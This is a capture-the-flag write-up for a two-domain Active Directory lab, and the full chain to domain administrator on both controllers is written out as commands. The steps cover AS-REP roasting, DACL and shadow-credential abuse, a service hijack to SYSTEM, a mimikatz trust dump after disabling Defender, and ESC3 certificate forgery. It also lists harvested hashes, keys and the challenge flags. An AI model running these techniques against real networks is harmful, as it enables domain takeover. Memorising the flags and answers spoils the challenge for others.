---
title: "Old Trusty"
ctf: "platypwnies 2026"
date: 2026-11-14
category: ad
difficulty: 3
points: n/a
flag_format: "PP{...}"
author: "author"
flags:
 - "PP{d4cl-4cls-sh4d0ws-4nd-s3rv1c3s} (flag 1 — LEGACY DC01 Administrator Desktop)"
 - "PP{trvst-th3-c3rt1f1c4t3-ch41n} (flag 2 — CORE DC02 Administrator Desktop)"
---

# Old Trusty

**Targets (live instance):**
- **LEGACY DC01** — `10.83.18.44`, domain `legacy.corp`
- **CORE DC02** — `10.83.18.45`, domain `core.corp`

One-way AD trust: **legacy trusts core** (from legacy's view `trustDirection=2` = outbound,
`trustAttributes=4` = QUARANTINED / SID-filtering). RC4 is disabled on both DCs — **AES only**.
Each DC has a flag on its Administrator's Desktop.

## Summary

Two flags, two very different chains. **Flag 1** is a clean legacy-domain kill chain with no
guesswork: AS-REP-roast a pre-auth-disabled user, abuse a three-hop DACL chain to write **shadow
credentials** onto a service account, then hijack a service's `binPath` (`SERVICE_CHANGE_CONFIG`)
to run as SYSTEM. **Flag 2** is the hard one and the real lesson of the challenge: the one-way
trust is *usable*, but only if you can derive the **inter-realm trust account's AES256 key**. The
ADC tooling all gets this wrong, because a binary trust password contains **lone UTF-16
surrogates**, and Windows vs Python encode lone surrogates differently when converting UTF-16LE →
UTF-8 (Windows substitutes U+FFFD; Python's `surrogatepass` emits CESU-8). That single byte-level
discrepancy changes the PBKDF2 seed and therefore the AES key. Doing the derivation on Windows
itself (PowerShell/.NET) yields the correct key; with a TGT for `core.corp\LEGACY$` we enumerate
CORE, find an enrollment-agent credential on a share, and run a classic **ESC3** certificate abuse
to PKINIT as `core\Administrator`.

## Solution / Exploit

### FLAG 1 — LEGACY DC01

**Step 1 — AS-REP roast (no creds).**

```bash
GetNPUsers.py legacy.corp/ -dc-ip 10.83.18.44 -usersfile users.txt -no-pass
# legacy\jdoe : spongebob1 (pre-auth disabled)
```

**Step 2 — DACL chain to shadow credentials on `svc_ops`.** BloodHound/manual enumeration gives:

1. `jdoe` has **WriteDacl** on group **"Legacy App Maintainers"**
2. **"Legacy App Maintainers"** has **AddMember** on **"Infrastructure Support"**
3. **"Infrastructure Support"** has **AddKeyCredentialLink** on **`svc_ops`**

```bash
# Grant jdoe WriteMembers on "Legacy App Maintainers"
dacledit.py -action write -rights WriteMembers -principal jdoe \
 -target "Legacy App Maintainers" -use-ldaps \
 -dc-ip 10.83.18.44 legacy.corp/jdoe:spongebob1

# Walk the membership chain (LDAPS/636 required — LDAP/389 rejects the writes)
net rpc group addmem "Legacy App Maintainers" jdoe -U legacy.corp/jdoe%spongebob1 -S 10.83.18.44
net rpc group addmem "Infrastructure Support" jdoe -U legacy.corp/jdoe%spongebob1 -S 10.83.18.44

# Shadow credentials on svc_ops
certipy shadow auto -u jdoe@legacy.corp -p spongebob1 -account svc_ops -dc-ip 10.83.18.44
# -> svc_ops NT hash: 4e631ddaaae8bf1601b67179f3b7ddaa
```

**Step 3 — ReportSync service abuse → SYSTEM.** `svc_ops` holds **SERVICE_CHANGE_CONFIG** on the
`ReportSync` service (binPath was `cmd.exe /c exit 0`, i.e. a no-op "Legacy Report Synchronization
Agent"). The SCM kills service children after a timeout, so for anything non-trivial we point the
service at a **scheduled task**:

```bash
services.py -hashes :4e631ddaaae8bf1601b67179f3b7ddaa -dc-ip 10.83.18.44 \
 legacy.corp/svc_ops@10.83.18.44 change -name ReportSync \
 -path 'cmd.exe /c schtasks /create /tn ReadFlag /tr "cmd /c type C:\Users\Administrator\Desktop\flag.txt > C:\challenge\flag_out.txt" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn ReadFlag'

services.py ... start -name ReportSync # returns ERROR_SERVICE_REQUEST_TIMEOUT, but it runs
```

Read `C:\challenge\flag_out.txt` over SMB → **flag 1**.

### FLAG 2 — CORE DC02

**Step 1 — extract the trust secret from DC01.** With SYSTEM on DC01 (from flag 1), first reset
and then dump the trust material:

```
nltest /sc_change_pwd:core.corp # refresh the TDO password
mimikatz # privilege::debug
mimikatz # lsadump::trust /patch
```

This returns the trust's **CLEAR** password blob (240 bytes here) and mimikatz's derived keys for
the `[Out] CORE.CORP -> LEGACY.CORP` direction — that is the shared secret behind the `LEGACY$`
trust account on core. (An empty `[In]` direction is expected: the cross-realm referral path won't
work, but **direct authentication as the trust account does**.)

**Step 2 — the AES key-derivation trap.** The trust password is a random binary blob, and
interpreting it as UTF-16LE produces **lone surrogates** (unpaired code units in U+D800–DFFF).
Windows derives the AES256 Kerberos key by: UTF-16LE → UTF-8, then PBKDF2-HMAC-SHA1(password,
salt, 4096), then the RFC 3962 DK step. The catch is the UTF-16LE→UTF-8 step:

| Implementation | Lone surrogate U+D800 becomes |
|---|---|
| **Windows (.NET)** | U+FFFD → `EF BF BD` |
| **Python `surrogatepass`** (impacket, certipy, …) | CESU-8 → `ED A0 80` |
| **Python `errors='replace'`** | U+FFFD → `EF BF BD` (matches Windows) |

In this challenge's 240-byte blob, **9 bytes differed** between the two encodings → a *completely
different* PBKDF2 seed and therefore a different AES key. On top of that, mimikatz uses a generic
trust salt, while the KDC advertises **`CORE.CORPkrbtgtLEGACY`** for the `LEGACY$` account (visible
in PA-ETYPE-INFO2 during AS-REQ). So neither mimikatz's key (wrong salt) nor any Python derivation
(wrong UTF-8 encoding) works.

**Step 3 — derive the correct key on Windows.** Upload a PowerShell script to DC01 that does the
conversion with .NET and derives the key with the KDC's salt:

```powershell
$clear_hex = "65 f6 29 95 ..." # the CLEAR blob from mimikatz
$bytes = [byte[]]($clear_hex.Trim -split '\s+' | % { [Convert]::ToByte($_,16) })
$password_str = [System.Text.Encoding]::Unicode.GetString($bytes) # UTF-16LE
$utf8_bytes = [System.Text.Encoding]::UTF8.GetBytes($password_str) # lone surrogates -> U+FFFD
$salt = [System.Text.Encoding]::UTF8.GetBytes("CORE.CORPkrbtgtLEGACY")
$dk = (New-Object System.Security.Cryptography.Rfc2898DeriveBytes($utf8_bytes,$salt,4096)).GetBytes(32)
"AES256: " + [BitConverter]::ToString($dk).Replace("-","").ToLower
```

```
AES256: b6f87dbf1674c4a50785fb13c6912690924aef0d070a9f653ab2cfd36dbc0d88
```

**Step 4 — authenticate as `LEGACY$` to CORE's KDC.**

```bash
getTGT.py -aesKey b6f87dbf1674c4a50785fb13c6912690924aef0d070a9f653ab2cfd36dbc0d88 \
 -dc-ip 10.83.18.45 core.corp/LEGACY\$
# TGT for LEGACY$@CORE.CORP obtained
```

**Step 5 — enumerate CORE through the trust account.** Get a service ticket and browse SMB:

```bash
KRB5CCNAME=./LEGACY\$.ccache getST.py -k -no-pass \
 -spn cifs/DC02.core.corp -dc-ip 10.83.18.45 core.corp/LEGACY\$

KRB5CCNAME='./LEGACY$@cifs_DC02.core.corp@CORE.CORP.ccache' smbclient.py -k -no-pass DC02.core.corp
```

The `Software$` share contains `PKI/LegacyClient/enrollment-agent.xml`, holding credentials for
`svc_enrollment@core.corp`:

```
svc_enrollment : oUqaAUD/Te3RSlK2F/Eo5KRAAx1enUPE/qKwxhriK864PlM6aA1!
```

**Step 6 — ESC3 (enrollment-agent certificate abuse).**

```bash
certipy find -u svc_enrollment@core.corp \
 -p 'oUqaAUD/Te3RSlK2F/Eo5KRAAx1enUPE/qKwxhriK864PlM6aA1!' -dc-ip 10.83.18.45 -target 10.83.18.45
```

`svc_enrollment` (via the `PKI Automation` group) can enroll the **`EnrollmentAgent`** template
(EKU *Certificate Request Agent*), and the **`User`** template accepts enrollment agents with **no
principal restriction** — textbook ESC3:

```bash
# 1) get an enrollment-agent certificate
certipy req -u svc_enrollment@core.corp \
 -p 'oUqaAUD/Te3RSlK2F/Eo5KRAAx1enUPE/qKwxhriK864PlM6aA1!' \
 -ca CORE-CORE-DC02-CA -template EnrollmentAgent -target 10.83.18.45 -dc-ip 10.83.18.45

# 2) use it to request a cert on behalf of Administrator
certipy req -u svc_enrollment@core.corp \
 -p 'oUqaAUD/Te3RSlK2F/Eo5KRAAx1enUPE/qKwxhriK864PlM6aA1!' \
 -ca CORE-CORE-DC02-CA -template User -on-behalf-of 'core\Administrator' \
 -pfx svc_enrollment.pfx -target 10.83.18.45 -dc-ip 10.83.18.45
# -> administrator.pfx
```

**Step 7 — PKINIT as Administrator, then read the flag.**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.83.18.45
# core\Administrator NT hash: 6a1d63f952ad27b6bf764616d0460283 (TGT -> administrator.ccache)

KRB5CCNAME=./administrator.ccache smbclient.py -k -no-pass DC02.core.corp
# use C$ ; get Users\Administrator\Desktop\flag.txt
```

## Flag(s)

```
PP{d4cl-4cls-sh4d0ws-4nd-s3rv1c3s} # flag 1 — LEGACY DC01 \Users\Administrator\Desktop\flag.txt
PP{trvst-th3-c3rt1f1c4t3-ch41n} # flag 2 — CORE DC02 \Users\Administrator\Desktop\flag.txt
```

## Notes / Pitfalls

This box cost several sessions. The dead ends are the writeup.

- **Defender eats mimikatz.** On a *fresh* instance, Defender is ON and deletes `mimikatz.exe` on
 landing. Disable real-time protection (and/or add an exclusion) and re-upload.
- **`services.py start` always "fails".** It returns `ERROR_SERVICE_REQUEST_TIMEOUT` even when the
 payload executed as SYSTEM. Don't chase the error — verify side effects (the output file).
- **"The trust is misprovisioned / half-built" was WRONG.** An important intermediate conclusion
 (Sessions 5–6) was that CORE had no accepting trust for LEGACY and the trust was one-way/broken —
 backed by real evidence: legacy's TDO `trustAuthOutgoing` empty, `getST krbtgt/CORE.CORP` →
 `KDC_ERR_S_PRINCIPAL_UNKNOWN`, CORE rejecting every forged inter-realm ticket
 (`KRB_AP_ERR_BAD_INTEGRITY` for AES, `ETYPE_NOSUPP` for RC4), and a **129-salt-convention brute**
 × {impacket KDF, raw PBKDF2} × {raw, u16, hex, latin1, truncated, reversed, base64,
 surrogatepass…} producing **zero** hits. The lesson: the brute looked exhaustive but was
 systematically wrong in the one dimension nobody varied — *the UTF-16LE→UTF-8 conversion of lone
 surrogates*.
- **The cross-realm referral is genuinely dead here** — don't waste time on `getST krbtgt/CORE.CORP`
 or forged inter-realm tickets. The working path is a **direct AS-REQ as the trust account**
 (`core.corp\LEGACY$`) with a correctly-derived AES key; NTLM is rejected for trust accounts
 (`STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`), and RC4 is off on both DCs, so **an AES key is
 mandatory**.
- **Salt must be the KDC's, not mimikatz's.** `CORE.CORPkrbtgtLEGACY` (as advertised in
 PA-ETYPE-INFO2), *not* a generic `LEGACY.CORPkrbtgt`-style salt.
- **Coercion was a dead end.** EFSRPC not listening even on a null session, PrinterBug
 `ept_s_not_registered` (spooler off), DFSNM needs an authenticated core session we didn't have.
 CORE exposes only the standard DC port set (no HTTP/web-enrolment; no WinRM/RDP).
- **CORE does not trust LEGACY-CA.** A cert forged with the legacy CA key for `administrator@core.corp`
 (or `legacy@core.corp`) → PKINIT → `KDC_ERROR_CLIENT_NOT_TRUSTED`. The bridge into core is the
 **trust account + core's own CA**, not the legacy CA.
- **DNS was a red herring.** legacy's `core.corp` zone was an AD-integrated secondary with 0
 records (DC01 couldn't resolve `dc02.core.corp` or `_kerberos._tcp.core.corp`); we added A/SRV
 records as DA and it still didn't change the Kerberos outcome.
- **Provisioning details (for archaeology).** The bootstrap script `common.ps1` on the role disk
 describes `Ensure-ChallengeCA` (LEGACY-CA on DC01), `Set-PeerConditionalForwarder`,
 `Install-ChallengeFlag`, and `Rotate-DomainAdministratorPassword` (a random
 `base64(36B)+"aA1!"`). Its `BootstrapPassword = "Packer-Build-Only-2026!"` is build-only and is
 **not** valid on a live box (the Administrator password is rotated at provisioning). The
 trust-creation role scripts were deleted after provisioning, so their text is not recoverable.

## Credentials collected

| Account | Domain | Credential |
|---|---|---|
| `jdoe` | legacy.corp | `spongebob1` / NT `54bd2b0484dae7de17cce2f837597b76` |
| `svc_ops` | legacy.corp | NT `4e631ddaaae8bf1601b67179f3b7ddaa` |
| `Administrator` | legacy.corp | NT `9142e1c061faa6bc1092f213dc15af38` |
| `krbtgt` | legacy.corp | NT `09a414480b16a946027edad9c9d260c9` |
| Trust (`LEGACY$` on core) | core.corp | AES256 `b6f87dbf1674c4a50785fb13c6912690924aef0d070a9f653ab2cfd36dbc0d88` |
| `svc_enrollment` | core.corp | `oUqaAUD/Te3RSlK2F/Eo5KRAAx1enUPE/qKwxhriK864PlM6aA1!` |
| `Administrator` | core.corp | NT `6a1d63f952ad27b6bf764616d0460283` |

## Domain SIDs

- LEGACY: `S-1-5-21-472651491-2478382064-1031694744`
- CORE: `S-1-5-21-2429661416-260090189-2427659033`

## Artifacts in this folder

| Path | What |
|---|---|
| `HANDOFF.md` | The full flag-1 + flag-2 writeup as it was solved (absorbed above) |
| `artifacts/ot_OPERATOR-SESSION-LOG.md` | Session-by-session operator log (flag 1 solved; flag 2 dead ends) |
| `artifacts/ot_SESSION5-FINDINGS.md` | The "trust is misprovisioned" (wrong) conclusion + evidence |
| `artifacts/ot_SESSION6-FINDINGS.md` | Fresh-instance trust matrix, salt brute, Netlogon/`common.ps1` archaeology |
| `artifacts/tk_clear.bin` | The 512-byte raw trust secret (`MD4(tk_clear) == TDO rc4`) |
| `artifacts/legacy_dcsync.ntds.kerberos` | legacy Kerberos keys (Administrator/krbtgt/jdoe/svc_ops/DC01$ …) |
| `artifacts/tk*.ps1` | The PowerShell journey: TDO parsing + LSA trust-info extraction (`tk9`/`tkE`/`tkF` = LSA-via-C# and VSS ntds copy) |
| `artifacts/LEGACY$.ccache`, `administrator.ccache`, `svc_ops.ccache`, `svc_enrollment.ccache`, `jdoe.ccache`, `LEGACY$@*.ccache` | Kerberos tickets as collected |
| `artifacts/svc_enrollment.pfx`, `administrator.pfx` | Enrollment-agent cert and the forged `core\Administrator` cert |
| `artifacts/*.py` | TDO/trust + KDF validation helpers (`findtdo`, `parse_tdo`, `tdo*`, `keyoracle`, `realmtest`) |
| `artifacts/cl_dfscoerce.py`, `cl_PetitPotam.py` | Coercion attempts (both dead ends) |
| `artifacts/krb5.conf`, `trustdump.txt`, `cracked_jdoe.txt`, `valid_*.txt`, `users_curated.txt` | Recon outputs |
| `chall-info.txt`, `challenge.json` | Platform metadata |

*Not copied here (kept out to avoid shipping large binaries / live credential material): the
`ntds.dit`/hive dumps, `rockyou.txt`, and the `mimikatz.exe` binary — all recoverable in-place
under `solved-challs/Old Trusty/ot_recon/`.*
